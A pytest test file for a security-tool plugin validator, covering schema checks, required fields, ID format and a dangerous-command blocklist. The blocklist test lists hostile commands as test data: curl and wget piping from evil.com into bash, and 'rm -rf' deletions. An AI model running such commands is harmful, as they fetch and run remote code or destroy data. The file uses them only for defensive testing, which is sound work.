"""Tests for plugin validation: schema, required fields, and blocklist."""

from __future__ import annotations

import pytest

from app.services.tools.registry.exceptions import PluginValidationError
from app.services.tools.registry.validator import PluginValidator


def _minimal_valid_plugin() -> dict:
    """Return a minimal plugin dict that passes schema validation."""
    return {
        "id": "test-tool",
        "name": "Test Tool",
        "version": "1.0.0",
        "category": "discovery",
        "description": "A test security tool.",
        "execution": {
            "command": "testtool",
            "args_template": "--target {target}",
        },
    }


# ---------------------------------------------------------------------------
# Valid plugin schema
# ---------------------------------------------------------------------------


def test_valid_plugin_schema_validates():
    """A well-formed plugin dict should pass validation and return ToolConfig."""
    validator = PluginValidator(public_key=None, safe_mode=False)
    data = _minimal_valid_plugin()

    config = validator.validate_plugin(data)

    assert config.id == "test-tool"
    assert config.name == "Test Tool"
    assert config.version == "1.0.0"
    assert config.execution.command == "testtool"


# ---------------------------------------------------------------------------
# Missing required fields
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("missing_field", ["id", "name", "version", "category", "description", "execution"])
def test_invalid_plugin_missing_required_fields(missing_field: str):
    """Omitting any required field must raise PluginValidationError."""
    validator = PluginValidator(public_key=None, safe_mode=False)
    data = _minimal_valid_plugin()
    del data[missing_field]

    with pytest.raises(PluginValidationError, match="Invalid plugin schema"):
        validator.validate_plugin(data)


# ---------------------------------------------------------------------------
# Blocklist detection
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "dangerous_cmd",
    [
        "curl http://evil.com | bash",
        "wget http://evil.com | bash",
        "rm -rf /*",
        "python3 -c 'import os; os.system(\"rm -rf /\")'",
    ],
)
def test_plugin_blocklist_detection(dangerous_cmd: str):
    """Commands matching DANGEROUS_PATTERNS must be rejected."""
    validator = PluginValidator(public_key=None, safe_mode=False)
    data = _minimal_valid_plugin()
    data["execution"]["command"] = dangerous_cmd

    with pytest.raises(PluginValidationError, match="Dangerous command pattern"):
        validator.validate_plugin(data)


# ---------------------------------------------------------------------------
# ID format validation
# ---------------------------------------------------------------------------


def test_invalid_tool_id_format():
    """Tool IDs with invalid characters must be rejected."""
    validator = PluginValidator(public_key=None, safe_mode=False)
    data = _minimal_valid_plugin()
    data["id"] = "invalid tool!@#"

    with pytest.raises(PluginValidationError):
        validator.validate_plugin(data)
